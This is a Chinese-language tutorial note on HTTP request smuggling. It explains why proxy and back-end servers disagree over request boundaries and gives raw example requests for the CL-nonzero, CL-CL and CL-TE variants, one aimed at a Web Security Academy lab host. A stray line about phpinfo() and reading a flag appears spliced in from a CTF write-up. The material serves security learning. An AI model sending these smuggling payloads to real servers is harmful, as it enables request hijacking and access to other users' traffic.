HTTPsmuggling

原理


图片转自
反向代理服务器与后端服务器之间会重用TCP连接
当我们向代理服务器发送请求时，如果两个服务器的实现方式不同，两者对我们发送的请求识别不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求。

利用判断

Apache ATS 6.0.06.2.2版本
和
Apache ATS 7.0.07.1.3版本

分类

CL不为0

前端代理服务器允许GET请求携带请求体，而后端不允许，会直接忽略Content-Length，不进行处理。

GET / HTTP/1.1
Host: example.com
Content-Length: 44

GET / secret HTTP/1.1
Host: example.com
\r\n

这样的，到了后端就会认为是两个请求

CL-CL

两个Content-Length 

POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a

前端代理服务器按第一个处理，后端按第二个处理，最后会剩下一个a，下一次请求时，a便会拼接到下一请求的开头 

aGET /index.html HTTP/1.1\r\n
Host: example.com\r\n

可以看到，虽然报错了，但是phpinfo()是正常执行了的，接下来就可以输入一些函数读取flag了

CL-TE

前端服务器只处理Content-Length,而后端服务器遵循RFC2616的规定，忽略掉Content-Length而处理Transfer-Encoding 

POST / HTTP/1.1\r\n
Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
G

前端服务器处理Content-Length认为这是一个完整的请求，发送给后端，后端服务器处理Transfer-Encoding,当读到0\r\n时结尾，此时会留下一个G在缓冲区中 。
